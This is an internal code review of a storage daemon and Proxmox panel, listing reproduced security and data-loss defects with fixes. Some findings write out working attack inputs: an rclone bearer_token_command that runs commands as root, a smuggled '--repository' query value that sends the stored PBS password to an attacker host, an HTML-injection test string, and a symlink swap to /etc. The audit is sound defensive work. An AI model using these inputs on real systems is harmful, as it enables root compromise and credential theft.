# Whole-project code review — 2026-11-14

**Status:** read-only review at main `7ca16714a` (everything built for the release after 0.4.5, unreleased), operator-ordered before that release ("we run a full-codebase review on opus"). Nothing here is fixed by this document; it is the evidence for the `cr3` stories in `docs/EPICS.md`. Operator, on the findings as they arrived: "Agreed - must fix before release - we should catch the lower priority too since we have it open."

**How it was done.** Fourteen reviewers, one per area ("door"), each reading its files in full against `docs/PRINCIPLES.md`, EPICS §2 and `docs/DESIGN.md`, plus one cross-cutting pass for values shown as state that no read supplied (operator: "Hard-coded values that don't derive from actual state are worrisome."). Each reviewer proved a defect before filing it: a probe that runs the real function, route or panel file with constructed input, or the real tool (`rclone`, `proxmox-backup-client`, `testparm`, `setfacl`, `find`) on a scratch tree. The probes are kept outside the repository and each becomes the failing test of its fix.

**Reading a finding.** `AREA-<severity><n>`: **C** = root command execution, data loss or a wrong object destroyed by an ordinary request; **H** = a wrong destructive act, a leaked secret or a lie about data safety under a plausible condition; **M** = a wrong answer or stranded state the operator can recover from; **L** = everything else worth a line. `DEFECT repro` = reproduced by a probe; `DEFECT read` / `line path` = traced line by line, not run; `POSSIBLE` = suspected, with what would settle it; `NOTICED` = worth knowing. Paths are relative to `packages/daemon/src` unless they name another package or a panel file (`NN-name.js` is under `packages/pve-integration/src`). A line number is the reviewer's at `7ca16714a`: confirm before fixing.

**Coverage is stated per area** (files read in full, in part, not reached). A file not reached was not reviewed.

**Not yet in this document (reviews still running when it was first committed):** AHR scrub and self-heal, iSCSI, Remote mounts, Cross-cutting: values shown as state that no read supplied.

---

## Settled in a browser (PVE 9.2, ExtJS 7.0.0.168)


SETTLED: a ComboBox with the DEFAULT BoundList template renders displayField as RAW HTML:
  store row label '<b id="inj1">p</b>' -> .x-boundlist-item innerHTML '<b id="inj1">p</b>', document.getElementById('inj1') exists.
  => replication M3 (remote zpool list lines into the pool combo) and backup-panel M5 (PBS group ids / archive file names into combos) are REAL HTML injection; both rise to H (a compromised replication target or PBS server gets script into the admin's PVE session). Fix both ends: validate the lines at the daemon (PoolName; PBS id/archive charset) AND `listConfig.tpl` with {label:htmlEncode} on every combo whose rows come from command or server output. Sweep ALL combos in the panels for this.
SETTLED: btn.setTooltip('<b>..') stores the raw string in data-qtip (no encoding by ExtJS).
NOT SETTLED by this run: the QuickTip body render (forced hover did not show the tip within 1.5 s). ExtJS QuickTip puts the attribute text into the tip as HTML by design (PVE's own code double-encodes); treat single-encoded data-qtip and raw setTooltip as to-fix: encode twice / enc() at each sink (39-ahr.js:1660, 30-pools.js:601, 60-datasets.js ~950, 69-scrubs.js:1085,1136,1146,1257,1263, 12-picker.js:1234, 14-permissions.js:523).

---

## Cloud sync

Coverage: cloud — daemon + shared read in full; 72-cloud.js ~30% (renderers, remote dialog, wizard submit).

- **CLOUD-C1** DEFECT repro  services/rclone-probe.ts:440-463, routes/cloud.ts:684-744 — Sys.Audit-only identity runs any command as root via unsaved remote Test: POST /v1/cloud/remotes/test {"remote":{"name":"x","type":"webdav","options":{"url":"http://127.0.0.1:9/","bearer_token_command":"<cmd>"}}}. Path is in READ_JOB_ROUTES.exact (shared/schemas/api.ts:180-181) so gateway policy.ts:58 admits on Sys.Audit; testRemote copies EVERY option to env RCLONE_CONFIG_ANASTEST_<KEY>; rclone runs bearer_token_command in NewFs as root. Probes probe-audit-test-command.mts (real createServer, 202, env recorded) + cmd-probe/run.sh (real rclone 1.75.2 ran the command; not run on 1.60.1 but option is in the 1.60.1 capture). Also cache backend chunk_path/db_path create dirs anywhere. Fix: the `remote` (unsaved) arm requires Sys.Modify; only the {name} arm stays a read job. NOTE: with Sys.Modify = root-equivalent by ruling, option allow-listing is secondary; the privilege boundary is the defect.
- **CLOUD-H2** DEFECT repro  services/rclone-config.ts:100-129 — secret rule misses key_pem (sftp raw private key), service_account_credentials (drive/gcs), sugarsync authorization: returned in plain to any Sys.Audit reader (GET /v1/cloud/remotes, job result, edit prefill), not masked. Probe probe-keypem-leak.mts. Fix: add to SECRET_NAMES + capture test over the catalogue help text.
- **CLOUD-H3** DEFECT repro  services/cloud-preview.ts:222 vs cloud-runner.ts:903-904 — sync preview dry-runs the LIVE tree (crosses into child datasets) and says "would delete 0"; the run reads <parent>/.zfs/snapshot/<label> where children are empty dirs and DELETES the destination's copy of every nested filesystem. Empty-source guard (:859-869) also reads the live tree. Probe nested-probe/run.sh (real rclone: preview deletes 0, run deletes 2). Fix: preview and guard evaluate the tree the run reads (--one-file-system; judge emptiness on snapshot root).
- **CLOUD-M4** DEFECT repro  cloud-runner.ts:888, routes/cloud.ts:1079 — consistency derived from task.source as written, not realpath (backup fixed: cr.64b2-iii (O), backup-runner.ts:702): symlinked source snapshots the wrong dataset, rclone follows the link to LIVE data, result says "Consistency: snapshot". Probe probe-symlink-consistency.mts.
- **CLOUD-M5** DEFECT repro (daemon) / read (panel)  shared/cloud-guide.ts:157-168 via routes/cloud.ts:478; 72-cloud.js:779-829, 1137-1149 — a remote with its own OAuth client cannot be edited: pair check ignores the stored secret (Save disabled; secret-only PUT refused "must be set together"). Probe probe-ownclient-update.mts.
- **CLOUD-M6** POSSIBLE  cloud-preview.ts:202, cloud-runner.ts:856/859 — in-process fs.stat/readdir on source: dead hard-NFS stalls libuv threads; inline preview reachable on Sys.Audit.
- **CLOUD-M7** POSSIBLE  services/cloud-retarget.ts:25-45 — retarget confirm misses sftp/ftp `user` (relative paths resolve under the login's home).
- **CLOUD-L8** POSSIBLE  cloud-units.ts:225-228 (routes/cloud.ts:530, 622/654) — referencing-task lookup fails open (unreadable unit dir = no tasks) -> opens delete refusal and retarget confirm; listServiceUnitsChecked exists.
- **CLOUD-L9** POSSIBLE  routes/cloud.ts:645-672 — remote delete by name, no identity binding, no lock.
- **CLOUD-L10** NOTICED  routes/cloud.ts:1115 — PUT task parses with defaults: omitted enabled re-enables, notify/mode/excludes reset (panel sends full body).
- **CLOUD-L11** NOTICED  72-cloud.js:1506-1527 — edit-mode Test drops other stored secrets -> false auth failure.
- **CLOUD-L12** NOTICED  rclone-config.ts:353/422 — any failing config dump mentioning password/encrypted/decrypt reported as password-protected file; list returns empty.

Other doors: source-claims.ts:201 fs.realpath in-process; source-guard.ts unreadable fstab fails open; ANAS.sched.pillHtml/softPill/runErrorTip encoding unverified.
Could not verify: rclone 1.60.1 goconfig quoted values; C1 on 1.60.1 itself (stunt node, harmless command); dead-NFS stall; panel half of M5.

## Backup (daemon)

Coverage: backup (daemon) — 15 files in full, 8 in large part; NOT reached: routes/backup.ts 2366-2703 (new-LUN route), schema 540-1000 and 1320-1600.

- **BACKUP-H1** DEFECT repro  routes/backup.ts:1837,1849 -> services/backup-reads.ts:182-185 — GET /backup/repos/:name/groups?group=<x> passes `group` unchecked as a pbc positional: `?group=--repository%3Duser%40pbs%40evil.example%3A8007%3Ax` overrides PBS_REPOSITORY; pbc sends the STORED PBS password/token to the attacker's host (Sys.Audit-only caller). Pinned PBS_FINGERPRINT is ignored when the attacker's cert is CA-valid. Covers pve:<id> repos too. Probes argv-probe.ts, listen.py, tlslisten.py (captured POST /api2/json/access/ticket with the password; tls-capture.txt). Related unchecked class: BackupBrowseRequest.snapshot/.archive (schema :1706,1708) bare z.string() (not exploitable today). Fix: validate group as <type>/<id>; `--` before positionals in every pbc argv builder (pbc `--` not probed).
- **BACKUP-H2** DEFECT repro  services/backup-runner.ts:99, 469-470 (routes/backup.ts:1518-1562, backup-task.ts:91-94) — every pbc "backup timestamp is older than last backup" is classed benign too-soon skip; a node clock BEHIND the newest snapshot (RTC/NTP step back) makes every scheduled run exit 0, row "success", lastSuccessAt advanced, mail "nothing new to back up" — no backup taken until the clock passes. Probe too-soon-probe.ts. Fix: too-soon only when the last local success is within seconds; else fail naming the clock.
- **BACKUP-M3** POSSIBLE  services/source-claims.ts:201-219 — in-process fs.promises.realpath unbounded on the run door (routes/backup.ts:1412, :1493; cloud too): dead hard-NFS blocks a libuv thread; four exhaust the pool. source-guard.ts:196-211 uses `timeout realpath -e` for the same paths. (cloud M6 same class)
- **BACKUP-M4** DEFECT repro  routes/backup.ts:1262-1295 — PUT /backup/tasks/:name parses with defaults: omitted enabled -> true (re-enables a disabled task), notify -> always, mode -> default (metadata continuity lost), limitNofile -> 1024, retention dropped. Probe put-omitted-probe.ts. (panel sends whole body; same as cloud L10 and the recorded replication PUT bug)
- **BACKUP-M5** DEFECT (line path)  services/backup-restore.ts:779-804 (:743) — failed image restore + failed re-enable: "THE TARGET IS STILL DISABLED" pushed to warnings then discarded; thrown error lacks it. Same shape backup-runner.ts:841-845 (transient not destroyed), backup-zvol.ts:231-257 (snapdev not restored; next run reads visible as prior and never restores).
- **BACKUP-M6** DEFECT repro  services/backup-runner.ts:127-130 — buildRepoString without brackets: IPv6 host -> "unable to parse repository url" on every run; Test reports stage auth. Real pbc probe (l14.txt/l15.txt).
- **BACKUP-M7** POSSIBLE  routes/backup.ts:2927 — file-restore gates never ask unmountedMountFor about the destination: restore into an unmounted dataset's empty mountpoint dir "completes", files hidden when it mounts.
- **BACKUP-L8** DEFECT (line path)  backup-restore-files.ts:1259-1273 + routes/backup.ts:2797-2803 — pathKind null = absent AND stat timed out: existing dir treated as created by this restore (confirm skipped; on failure may write .anas-restore-partial or rm -d).
- **BACKUP-L9** NOTICED  backup-snapshots.ts:258-291, task-units.ts:247-263 — transients swept only for the task's CURRENT targets (deleted task / moved path leave them).
- **BACKUP-L10** NOTICED task-units.ts:207-216 — units written with plain writeFile; failed daemon-reload after write = config already stored; removeTaskUnits ignores failed disable.
- **BACKUP-L11** NOTICED backup-repos.ts:173-180 — readRepoSecret maps any read error to null -> "No secret stored", credentialsSet false.

Other doors: gateway no per-route body/query validation (Principle 6?); pve-notify free-text into body lines.
Could not verify: pxar extractor vs planted symlink in an in-place target; dead-NFS; IPv6 in storage.cfg; journald LineMax vs big result line.

## Backup (panel)

Coverage: backup-panel — 68-backup.js read in full (8047 lines).

No C, no H.
- **BACKUP-PANEL-M1** DEFECT repro  68-backup.js:6045-6094, 6117-6122 — switching between two pxar archives of one snapshot keeps the previous archive's home and selections and submits them with the new archive (applyArchiveHome returns early when the new archive has no home; state cleared only on KIND change). A single-file in-place restore is not confirm-gated -> lands in the wrong directory silently. Same by reading: typed #restoreSnapshot (7247), repo/namespace/group change (7187-7235). Probe probe-restore-stale.mjs.
- **BACKUP-PANEL-M2** DEFECT repro  68-backup.js:3479-3497, 1462-1468, 1683-1694 — a task with one block-image archive whose path is not an iSCSI LUN can be created but never edited: edit derives "block", sends lun {targetIqn:"",index:0} -> schema 400. Probes probe-img-device-task.mjs, probe-kind-switch.mjs.
- **BACKUP-PANEL-M3** DEFECT repro  68-backup.js:3397-3405 vs routes/backup.ts:1662 — retention Preview on an edit with the namespace field cleared previews the STORED namespace (omitted = stored), Save treats omitted = cleared: preview describes a different group than the prune will hit. Probe probe-preview-ns.mjs.
- **BACKUP-PANEL-M4** POSSIBLE  68-backup.js:3443-3455, 4038-4080, 4365-4426 vs routes/backup.ts:1277-1290 — Edit and Enable/Disable send the whole task from a stale grid snapshot; revision bound at the route, not at dialog open -> lost update between two admins/tabs (also 75-iscsi.js:2213-2224 "Edit task…").
- **BACKUP-PANEL-M5** POSSIBLE (H if BoundList renders raw)  68-backup.js:7913-7916, 5993-5996; combos 7218-7228, 7267-7276 — PBS-server-controlled group ids and archive file names into combo labels unencoded; daemon parsers (services/backup-reads.ts:265-374) pass any backup-id/filename. Probe probe-pbs-strings.ts proves the daemon half. SAME browser question as replication M3.
- **BACKUP-PANEL-L6** DEFECT repro  68-backup.js:1604-1617, 1650-1655, 434-449 — files task inherits a LUN's group id after a kind switch (lun-<serial>); daemon guards block tasks only (routes/backup.ts:793).
- **BACKUP-PANEL-L7** NOTICED  68-backup.js:4878-4890, 5134 + routes/backup.ts:485-499 — auth type switch on edit keeps the old secret under the new meaning.
- **BACKUP-PANEL-L8** NOTICED  68-backup.js:4661-4668, 4971-4977 — any error from repo Test shown as stage tcp "cannot reach the host".
- **BACKUP-PANEL-L9** NOTICED  68-backup.js:3896-3900, 2873 — default row {etc,/etc} seeded as a stored name: retyped path keeps archive name `etc`.
- **BACKUP-PANEL-L10** NOTICED 68-backup.js:1095-1098, 3450-3452 — failed repositories read = empty list -> "Register a PBS repository first".
- **BACKUP-PANEL-L11** NOTICED 68-backup.js:6426-6444 — "This LUN" ignores a source change (confirm does name both).
- **BACKUP-PANEL-L12** NOTICED 68-backup.js:6379-6384, 6748-6751 — failed LUN inventory read greys "This LUN" with no reason.

Other doors: routes/backup.ts:639-643 inline repo Test with a name and no secret uses that name's stored secret against the request's host (Sys.Modify-scoped). 12-picker.js renders the same PBS strings.
Could not verify: BoundList default encoding; whether tree navigation destroys the Backup view mid-restore (poll stops silently); lost update in practice.

## Shares, identity, access

Coverage: shares — core routes/services/parsers read in full; share-identity.ts ~45%; panels 70/80/14/12 skimmed.

- **SHARES-H1** DEFECT repro  parsers/smb-conf.ts:28, 71-77 — SECTION_HEADER_RE `^\[(.+)\]\s*$` misses a header with trailing text (`[private] ; staff only`); Samba ends the name at the first `]` (testparm 4.25 proof, samba/hdr.conf). Next stanza folds into the one above: delete removes several shares; edit changes another share's valid users; create re-points an existing section; recycle purge deletes in the wrong path's #recycle; identity refs + uid-pick scan wrong; `[global] # x` -> second [global] prepended. Probe probe-smb-header.ts, probe-smb-header-recycle.mts. Fix: parse headers as Samba does, header line verbatim, testparm-checked fixture.
- **SHARES-H2** DEFECT repro  services/access.ts:1083-1087, 1118-1122, 1137-1141, 1156-1160 (+ stat :441) — non-recursive permissions writer follows a symlink at the target's final component: a user of an enclosing writable share swaps `projects -> /etc`; admin Apply runs root setfacl/chmod g+s/chown on the link target; PVE gates are lexical. Recursive form was hardened (10-16 H2), mountpoint-only form not. Probe symlink/probe-share-path-symlink.mts. Fix: lstat + refuse symlinked final component or realpath + re-gate; setfacl -P, chown -h.
- **SHARES-M3** DEFECT repro  services/access.ts:972-975, parsers/getfacl.ts:134-141, access.ts:263-274 — any Apply restates every named ACL entry through the 3-level abstraction and forces m::rwx: mask-clamped entry gains write, --x loses traverse, -w- -> rwx, r-- -> r-x; adds default ACL + setgid; GET shows granted not effective. Probe aclmask/probe-acl-mask.mts. DESIGN "Layered access" says the daemon preserves them.
- **SHARES-M4** DEFECT repro  routes/shares-smb.ts:413-426, shares-nfs.ts:256-264 via pve-footprint.sharePathClaim (:503-528) — failed `zfs list` => "no claim" => share/export created on a PVE-owned dataset (create door only). Probe probe-unreadable-zfs-share-path.mts. Fix: cannot-see verdict refuses. (Touches shares.r1 code from this release.)
- **SHARES-M5** DEFECT repro  parsers/exports.ts:135-186 — reader ignores backslash continuation, mid-line # comments, \ooo escapes: wrong clients shown; remove/replace orphan continuation lines. Probe probe-exports-continuation.mts.
- **SHARES-L6** DEFECT repro  routes/shares-smb.ts:592/707 — trailing space in path passes schema; Samba trims; gate judged untrimmed string (API caller only; panel trims). % substitutions in path read as missing.
- **SHARES-L7** POSSIBLE  shares-smb.ts:604-627, shares-nfs.ts:256-281 — ownership gate at route only, not re-run in job (ruling j).
- **SHARES-L8** POSSIBLE  shares-smb.ts:286-316, 475-496 — failed smbstatus = "no connections" skips the interface-binding confirm.
- **SHARES-L9** POSSIBLE  recycle-purge.ts:330,252 + packaging/systemd/anas-recycle.service — sequential lstat, no TimeoutStartSec: a dead hard mount hangs the purge forever.
- **SHARES-L10** NOTICED  shared/schemas/identity.ts — passwords accept control chars; newline truncates via smbpasswd -s stdin.

Other doors: disk-identity-cache.ts:393 smartctl no `--` (low).
Could not verify: exportfs -ra on an orphaned continuation line; Samba % macros in path; smbstatus service case.

## Datasets, snapshots, schedules

Coverage: datasets-schedules — daemon files read in full; panels 60/69-* only the request/submit parts.

- **DATASETS-SCHEDULES-H1** DEFECT repro  routes/datasets.ts:907-920, 960-961, 2209-2210 — forced rollback computes the swept snapshots from a list sorted by `creation` TIME (parsers/zfs-list.ts:266-270 parseSnapshotList), but `zfs rollback -r` destroys by createtxg. A received snapshot (keeps sender's creation time) or a stepped clock makes the orders disagree: snapshots destroyed that the confirm never named and whose holds were never read; a held one => partial rollback ("dataset is busy" after destroying others). Probe probe-rollback-order.mts (mock server, real route). Fix: sweep set = txg > target txg (readRollbackIds already reads createtxg) for scope, hold gate and warning. NOT run on real ZFS (could-not-verify: two-node stunt run).
- **DATASETS-SCHEDULES-H2** DEFECT repro  services/snapshot-schedules.ts:511-532 + routes/schedules.ts:487-520 — schedule owns snapshots by stamp `anas:schedule=<id>`, id = operator-typed slug, stamp survives schedule delete ("snapshots it already took are kept", 69-snapshots.js:1765). A NEW schedule with the same id adopts them: prunes to its policy, destroys ALL on an excluded child. Probe probe-stamp-id-reuse.mts: excluded destroy 10; no exclude sweep destroy 3. SCHEDULES-DESIGN.md:22 sentence is wrong. Fix: per-incarnation uid in unit JSON + stamp, or refuse/confirm-gate an id whose stamps already exist under the target.
- **DATASETS-SCHEDULES-L3** NOTICED  snapshot-schedules.ts:340-342, 523-529 — prune destroys stamped snapshots on an excluded child even if PVE-owned (ownership gate skips excluded subtrees).
- **DATASETS-SCHEDULES-L4** DEFECT repro  services/nested-filesystems.ts:159-165 — prune paths passed to `find -path` are globs; a mount path with [ * ? \ is not pruned -> hang guard void, scan times out.
- **DATASETS-SCHEDULES-L5** POSSIBLE  69-scrubs.js:1085,1136,1146,1257,1263 (also 12-picker.js:1234, 14-permissions.js:523) — single-encoded value in data-qtip; QuickTip renders decoded attribute as HTML. Needs browser probe.
- **DATASETS-SCHEDULES-L6** POSSIBLE  services/scrub-schedules.ts:316-322 — unreadable/unparseable anas-scrub unit reads as null -> pools [] -> enabling one pool rewrites the unit dropping the others.
- **DATASETS-SCHEDULES-L7** NOTICED   scrub-schedules.ts:91-99 — failed `zfs get org.debian:periodic-scrub` reported as enabled. (invented-state class)
- **DATASETS-SCHEDULES-L8** NOTICED   snapshot-schedule-units.ts:306,328 — schedule name in Description= without % escaping (cosmetic).

Other doors: parseSnapshotList time-order used elsewhere? check replication newest-common / snapshotsBehind. Gateway does no schema validation of schedule body (PRINCIPLES §6 both boundaries?).
Could not verify: real rollback order; recursive fire vs forced child rollback race; new panel vs old daemon strips fire fields silently (skew banner?).

## Pools and disks (daemon)

Coverage: pools-disks — 21 files in full; pve-storage.ts, zfs-list.ts partly; telemetry parsers (arcstats, diskstats, net-dev, zpool-iostat) outline only.

- **POOLS-DISKS-H1** DEFECT repro  services/pve-footprint.ts:418-424 (+ parsers/pve-storage.ts:298, :401) — failed `zfs list` (mountpoints null) drops every PVE `dir` storage from the footprint -> poolPveGate (pools.ts:1089-1105) opens: DELETE /pools/tank gives the ordinary destroy confirm, not 409 PVE_MANAGED; same for export, mountpoint, add/remove vdev. Trigger: one suspended pool hangs operand-less `zfs list`. Comment :413-416 accepts the loosening on purpose (contradicts :31-40). Probe probe-pve-dir-storage-zfs-list-failed.mts. Fix: dir stanza present + null table => answer as unreadable config. SAME ROOT as shares M4 (sharePathClaim null).
- **POOLS-DISKS-H2** DEFECT repro (code path; lsblk premise unverified on a node)  routes/pools.ts:271-315 — destroy-cleanup calls a disk "exclusive" when its other partition shows no FSTYPE (lsblk cache, no PTTYPE asked), then `sgdisk --zap-all` whole disk (:3176): a raw partition used by a VM passthrough or LIO backstore loses its table entry. Attach pre-flight and AHR classifier use `blkid -p`. Probe probe-destroy-zap-unsigned-partition.mts. Fix: same blkid -p classifier; not blank or unreadable => shared.
- **POOLS-DISKS-M3** DEFECT repro  routes/scrub.ts:140-148 — failed `zpool status -jv` => every row "never scrubbed", running scrub reads idle. Probe probe-scrub-status-unreadable.mts. (invented-state class)
- **POOLS-DISKS-M4** DEFECT repro  routes/pools.ts:1657-1659, dashboard.ts:268-269, pools.ts:2248-2250 — failed `zpool list -j` reads "no pools" (GET /pools 200 [], dashboard pools not marked unavailable; GET /pools/import []; GET /pools/:name 404 for a live pool; collectDisks with failed status drops ZFS context -> FAULTED leaf healthy). listUnreadable exists (pools.ts:492-498). Probe probe-pool-list-failed-reads-empty.mts.
- **POOLS-DISKS-M5** DEFECT repro  routes/scrub.ts:213 + services/scrub-schedules.ts:316-322 — two AHR periodic-scrub toggles for different pools race on the one anas-scrub unit: lost update (only last writer's pool). Probe probe-ahr-scrub-toggle-race.mts. Fix: node-level exclusive lock key.
- **POOLS-DISKS-M6** DEFECT repro  routes/pools.ts:1282-1324 — raidzExpandGate has no degraded refusal (read model zfs-expansion.ts:154-178 has): direct POST widens a degraded raidz. Probe probe-raidz-expand-degraded.mts. Unverified whether OpenZFS refuses itself.
- **POOLS-DISKS-M7** DEFECT repro (ZFS output premise unverified)  routes/disks.ts:46-57 (:275) — stale kernel-named UNAVAIL leaf joined onto the NEW disk now holding that kernel name: blank replacement reads pool_member + critical, attach/replace refuse it. Probe probe-stale-kernel-leaf-claims-new-disk.mts.
- **POOLS-DISKS-M8** POSSIBLE  routes/pools.ts:1903-1952 — Upgrade offered on system pools; confirm says nothing about boot (legacy GRUB-on-ZFS). Needs operator ruling.
- **POOLS-DISKS-L9** NOTICED   pools.ts:143-153 — in-use hot spare shared with another pool wiped by cleanup.
- **POOLS-DISKS-L10** NOTICED  pools.ts:1424-1426 — cleanup disk lock keys use ZFS's by-id spelling, not inventory id.
- **POOLS-DISKS-L11** NOTICED  disks.ts:495-507 — GET /disks/:id/smart: probe failure reads "SMART not supported"; non-JSON => 500.
- **POOLS-DISKS-L12** NOTICED  zfs-expansion.ts:23-29 — detectLocalZfsVersion parses userland line, not kmod (harmless).
- **POOLS-DISKS-L13** NOTICED  disk-by-id.ts:29-46 — wholeDiskKernel('md127') -> 'md' (fails safe, wrong name).

Other doors: scrub-schedules.ts:91-99 failed zfs get => periodic scrub "On"; mounts.ts lexicalMountTargetReason: pool import has no live-mount collision gate.
Could not verify: OpenZFS attach to degraded raidz; lsblk FSTYPE for nested partition table / raw open; zpool status -j path+devid for swapped UNAVAIL leaf; smartctl NVMe smart_support; zpool upgrade rpool on legacy GRUB.

## Pools, disks, dashboard (panels)

Coverage: pools-panel (30-38, 40, 50, 15-gfx) — all reached; CSS and timeChart skimmed.

- **POOLS-PANEL-M1** DEFECT repro  38-pool-composer.js:1042 — Create composer deletes ALL whitespace from the mountpoint ("/srv/my pool" sent as "/srv/mypool"; daemon passes to zpool create -m, AbsolutePath allows spaces). Change-mount flow sends as typed. Same in 39-ahr-composer.js:762.
- **POOLS-PANEL-M2** DEFECT repro  50-dashboard.js:1454 (ZFS), :1064 (AHR) — every member disk tile hard-codes state 'online' (green tick) incl. a FAULTED/UNAVAIL leaf; telemetry carries no per-disk state. Fix: pass no state, or join leaf state.
- **POOLS-PANEL-M3** DEFECT repro  38-pool-composer.js:1187-1219 — multi-vdev "Add vdevs" = one job per vdev, no onFailed: failure midway leaves vdev 1 added (permanent on raidz), stale draft resends vdev 1, grid not reloaded.
- **POOLS-PANEL-M4** DEFECT repro  38-pool-composer.js:1262, 35-pool-attach.js:875 — pickers offer a hands-off disk (status==='available' only); daemon composableGate refuses at commit.
- **POOLS-PANEL-L5** DEFECT repro  38-pool-composer.js:335-337 — name rule accepts '.' and ':' (and says so); shared PoolName refuses -> 400.
- **POOLS-PANEL-L6** DEFECT/POSSIBLE 38-pool-composer.js:92,1055 — composer blocks single-disk log, daemon allows (DESIGN.md:1112 says log must be redundant: doc vs daemon); composer offers raidz for log/special/dedup, daemon isRedundantSpec accepts; OpenZFS likely refuses non-mirror -> job-time failure. Settle: `zpool create -n` on a node.
- **POOLS-PANEL-L7** DEFECT read   30-pools.js:1066-1073 — Scan column says "Scrubbing" for a resilver.
- **POOLS-PANEL-L8** NOTICED       unencoded sinks safe only by name grammar: 30-pools.js:601 held.detail tooltip, :875 upgrade confirmIntro, 40-disks.js:146 groupHeaderTpl, window titles 30:1387 31:187 34:208 35:809 38:1341 40:587.
- **POOLS-PANEL-L9** NOTICED       50-dashboard.js:1918-1924 — failed /v1/status blanks the warnings banner, keeps stale composite, toolbar says "just now".

Other doors: PoolName refuses '.', ':' which ZFS allows -> a hand-made pool tank.v2 400s on every /pools/:name (POSSIBLE). pools.ts:2246-2250 GET /pools/import returns [] on non-zero exit with empty stdout (failed scan reads "no importable pools").
Could not verify: zpool vs raidz for log/special/dedup; attach onto a leaf inside spare-N (35:650).

## Replication

Coverage: replication — 16 of 17 files in full; 65-replication.js ~1500 of 3442 lines (remotes manager window 1075-1550 and view assembly 3125-3442 not reached).

No C, no H.
- **REPLICATION-M1** DEFECT repro (daemon; ZFS side inferred from rrep.1a GT)  routes/replication.ts:436-445, 501-521 — single-dataset Replicate Once naming an OLDER snapshot the target already has: `discover` has no "target already has S" branch (planner has upToDate, replication-tree.ts:277); receive says "already exists; ignoring" exit 0; settleReplicationHolds moves the hold BACK to @S0 and releases @Sn on both sides, reports "incremental" success. Retention can then prune @Sn -> chain severed. Probe probe-older-snapshot-hold.mts. Fix: treat target-has-S as up to date (send nothing, do not move the hold) or refuse a named snapshot older than newest common. Settle on node pair: 3 snapshots replicated, Once of the middle one, `zfs holds` both sides.
- **REPLICATION-M2** DEFECT repro  services/replication-remotes.ts:324-329 pinHostKey (routes/replication-remotes.ts:437) — pin job checks the one confirmed (ed25519) fingerprint but writes EVERY key ssh-keyscan returned into known_hosts; an unconfirmed RSA/ECDSA line gets pinned. Probe probe-pin-extra-keys.mts. Fix: write only the line(s) whose fingerprint equals the confirmed one (pin and re-trust).
- **REPLICATION-M3** POSSIBLE  services/replication-transport.ts:321 -> 65-replication.js:680-685, 853-856, 2908-2921 — remote `zpool list` lines returned with no PoolName check and loaded into combos using the default BoundList template (not {label:htmlEncode}); a compromised target could inject HTML into the PVE origin. Needs a browser probe (stub /pools with ["<b>p</b>"], look for <b> in .x-boundlist-item). Fix: filter lines by PoolName at the source + encode in listConfig.tpl. Class applies to every combo fed from command output.
- **REPLICATION-L4** NOTICED  routes/replication.ts:658 vs 691-696 — recursive run claims cover the route's sweep, not the job's re-read sweep (R9).
- **REPLICATION-L5** NOTICED  routes/replication.ts:487-492, 795-800 — remote zfs recv stderr into job error + notification body verbatim, control chars not stripped (forged lines in mail body).
- **REPLICATION-L6** NOTICED  services/replication-units.ts:428 — LOCAL twin of the recorded "failed listing reads as everything behind"; comment at routes/replication-tasks.ts:94-96 wrong.

Could not verify: BoundList default encoding; M1 ZFS leg; M2 exploit leg (standard OpenSSH matching).
Clean: argv/remote quoting, unit files, fail-closed reads on the recursive path, holds across failure (recursive), R3/R5 at every door, PUT merge, no -F/-R/target destroy anywhere.

## Core, gateway, installers

Coverage: core — 45 of 48 files in full + CI workflows + packaging/ (install.sh, uninstall.sh, units; make-release.sh first 240 lines). No scripts/ dir exists.

No C, no H.
- **CORE-M1** DEFECT repro  gateway/src/proxy.ts:412 — cross-node forwarding trusts only the cluster CA (`new HttpsAgent({ca})`): a peer serving its own cert (pveproxy-ssl.pem, e.g. ACME) is unreachable -> 502 NODE_UNREACHABLE -> panel says "ANAS is not installed on this node". Probe peer-cert.mjs + tls/. PVE half (pveproxy serves pveproxy-ssl.pem to peers) not run on a node. Fix: accept the cert pmxcfs holds for that node (chain to cluster CA or exact fingerprint of /etc/pve/nodes/<node>/pveproxy-ssl.pem).
- **CORE-M2** DEFECT repro  packaging/install.sh:722-729, 761-769 — failed-upgrade rollback leaves anasd, anas, anas-recycle.timer DISABLED (disable --now ... restart, never enable): runs until next reboot then never starts; installs units from the NEW release's UNIT_SRC; does not restore /etc/default/anas overwritten by --port. Probe rollback-enable-probe.sh.
- **CORE-M3** DEFECT repro  gateway/src/proxy.ts:169 — a PVE user id with a non-latin1 character: x-anas-user raw string -> ERR_INVALID_CHAR -> 502 "anasd unavailable", every view "not installed". Probe header-utf8.mjs. Fix: percent-encode on the local hop, decode in readRequestAuthority.
- **CORE-L4** DEFECT repro  packaging/install.sh:15, 855 — `trap rollback ERR` without `set -E`: a failure inside a function phase1_install calls exits with no rollback. Probes errtrap*.sh, install-rollback-probe.sh. Fix: set -o errtrace.
- **CORE-L5** DEFECT repro (latent)  daemon/src/jobs/queue.ts:609-654, 695-697 — drain() not re-entrant: a body that releases/submits/throws before its first await -> nested drain -> job body runs twice. No current caller does. Probe drain-reentry.mts.
- **CORE-L6** DEFECT read  pve-integration/src/20-notinstalled.js:215-220 — every non-403 health failure (401 expired ticket, 502, 503, 504, NODE_UNREACHABLE) renders "ANAS is not installed … install the release"; gateway has a distinct ANAS_NOT_INSTALLED code.
- **CORE-L7** NOTICED  packaging/uninstall.sh:222-229 — uninstall leaves mdadm.conf PROGRAM pointing at a deleted binary; removes cache-loss recovery for surviving AHR pools.
- **CORE-L8** NOTICED  gateway/src/auth/proxy-key.ts:381-386, AnasProxy.pm:57-61 — any www-data process can sign root@pam + Sys.Modify (WAVE2 F11 chose this knowingly; DESIGN sentence "nothing else but root can" inaccurate). Operator's call.
- **CORE-L9** NOTICED  rulings conflict: read jobs on Sys.Audit (cr.67) vs cr.62 reader bound on fs/browse: PBS catalog browse and cloud preview inline arm (any local source) run on Sys.Audit. Operator's call.
- **CORE-L10** NOTICED  packaging/make-release.sh:236 — release smoke boots the real daemon, not --mock (as root on a node it runs boot scan / quarantine beside the live anasd).
- **CORE-L11** NOTICED  gateway/src/proxy.ts:172-173 — stale comment.

Other doors: shares-smb.ts:487 SMB global interface-binding confirm signs only {section:'global'} (ruling 2026-10-17: a confirm signs the names of every field it writes); ahr cache-event route: unplugging any disk with a GPT partition named <pool>-cache1 fires the rule (check it acts only when the cache PV is really missing).
Could not verify: pveproxy-ssl.pem to peers; non-latin1 user on a node; packaging/uninstall.sh restarts pveproxy at step 2 before removing timers/units (web-shell uninstall dies there).
